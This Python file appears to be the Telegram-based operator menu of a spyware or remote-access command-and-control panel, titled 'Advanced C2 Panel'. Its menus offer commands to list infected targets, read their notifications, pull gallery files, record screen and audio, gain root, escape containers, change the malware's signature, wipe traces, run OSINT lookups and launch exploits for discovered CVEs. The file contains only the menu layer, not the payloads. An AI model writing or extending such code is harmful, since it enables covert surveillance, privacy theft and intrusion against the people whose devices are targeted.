import json
import os
import logging
import threading
import time
from typing import Dict, Any, List, Optional
import telebot
from telebot import types

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class BotMenu:
    def __init__(self, bot: telebot.TeleBot, admin_id: int, supabase_sync=None, zero_day_hunter=None):
        self.bot = bot
        self.admin_id = admin_id
        self.supabase_sync = supabase_sync
        self.zero_day_hunter = zero_day_hunter
        self.dynamic_commands = []
        self.vulnerability_commands = []
        self.log_file = "bot_audit.log"
        self._register_handlers()
        self._start_auto_refresh()

    def _audit_log(self, user_id, action, details):
        log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Admin: {user_id} - Action: {action} - Target: {details}\n"
        with open(self.log_file, "a") as f:
            f.write(log_entry)

    def _register_handlers(self):
        @self.bot.message_handler(commands=['start', 'menu'])
        def show_main_menu(message):
            if message.from_user.id != self.admin_id: return
            self._refresh_data()
            markup = types.InlineKeyboardMarkup(row_width=3)
            buttons = [
                types.InlineKeyboardButton("📱 Devices", callback_data="menu_devices"),
                types.InlineKeyboardButton("📩 Notifs", callback_data="menu_notifs"),
                types.InlineKeyboardButton("🔞 AI Radar", callback_data="menu_ai_radar"),
                types.InlineKeyboardButton("📸 Media", callback_data="menu_media"),
                types.InlineKeyboardButton("🎥 Live", callback_data="menu_live"),
                types.InlineKeyboardButton("☠️ Adv-Exploit", callback_data="menu_adv"),
                types.InlineKeyboardButton("🔬 Evolve", callback_data="menu_evolve"),
                types.InlineKeyboardButton("📊 OSINT", callback_data="menu_osint"),
                types.InlineKeyboardButton("⚠️ Zero-Day", callback_data="menu_zero_day")
            ]
            markup.add(*buttons)
            if self.vulnerability_commands:
                markup.add(types.InlineKeyboardButton("🔥 NEW VULN DETECTED!", callback_data="menu_zero_day"))
            self.bot.send_message(message.chat.id, "🎮 **Advanced C2 Panel**\nSystem Status: *Ready*", parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
        def handle_menu(call):
            if call.from_user.id != self.admin_id: return
            cmd = call.data[5:]
            markup = types.InlineKeyboardMarkup(row_width=1)
            back = types.InlineKeyboardButton("🔙 Back", callback_data="menu_main")
            if cmd == "devices":
                text = "📱 **Devices:**\n/list - All targets\n/info [id] - Deep scan"
            elif cmd == "notifs":
                text = "📩 **Notifications:**\n/get_notifs [id] - Fetch messages"
            elif cmd == "ai_radar":
                text = "🔞 **AI Radar:**\n/sens_scan [id] - Force scan\n/ai_status [id] - Radar health"
            elif cmd == "media":
                text = "📸 **Media Vault:**\n/gallery [id] - Latest captures\n/download [id] [file_id] - Get file"
            elif cmd == "live":
                text = "🎥 **Live Actions:**\n/record_screen [id] [sec] - Screen record\n/screenshot [id] - Screenshot\n/record_audio [id] [sec] - Audio"
            elif cmd == "adv":
                text = "☠️ **Advanced:**\n⚡ /root [id] - Get root\n⬆️ /privesc [id] - Privilege escalation\n🐳 /escape [id] - Container escape"
            elif cmd == "evolve":
                text = "🔬 **Self-Evolve:**\n🦎 /polymorph - Change signature\n💊 /self_heal - Repair modules\n💀 /destruct [id] - Wipe traces"
            elif cmd == "osint":
                text = "📊 **OSINT:**\n✉️ /osint_email [email]\n📞 /osint_phone [num]\n👤 /osint_user [user]"
            elif cmd == "zero_day":
                text = "⚠️ **Zero-Day Hunter Result:**\n"
                if self.vulnerability_commands:
                    for v in self.vulnerability_commands:
                        text += f"📍 `{v.get('cve', 'N/A')}` -> Target: {v.get('target_app')}\n"
                        markup.add(types.InlineKeyboardButton(f"💥 Exploit {v.get('cve')}", callback_data=f"exploit_{v.get('cve')}"))
                else:
                    text += "_No new vulnerabilities found._"
            else:
                text = "Select action:"
            markup.add(back)
            self.bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=markup)

        @self.bot.callback_query_handler(func=lambda call: call.data == "menu_main")
        def back_to_main(call):
            self.bot.delete_message(call.message.chat.id, call.message.message_id)
            show_main_menu(call.message)

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith("exploit_"))
        def handle_direct_exploit(call):
            if call.from_user.id != self.admin_id: return
            vuln_cve = call.data.split("_")[1]
            self.bot.answer_callback_query(call.id, f"Exploiting {vuln_cve}...")
            self._audit_log(call.from_user.id, "direct_exploit", vuln_cve)

    def _refresh_data(self):
        if self.zero_day_hunter:
            self.vulnerability_commands = self.zero_day_hunter.get_recent_vulnerabilities()
        if self.supabase_sync:
            self.dynamic_commands = self.supabase_sync.get_available_commands()

    def _start_auto_refresh(self):
        def loop():
            while True:
                self._refresh_data()
                time.sleep(300)
        threading.Thread(target=loop, daemon=True).start()

def setup_bot_menu(bot, admin_id, supabase_sync=None, zero_day_hunter=None):
    return BotMenu(bot, admin_id, supabase_sync, zero_day_hunter)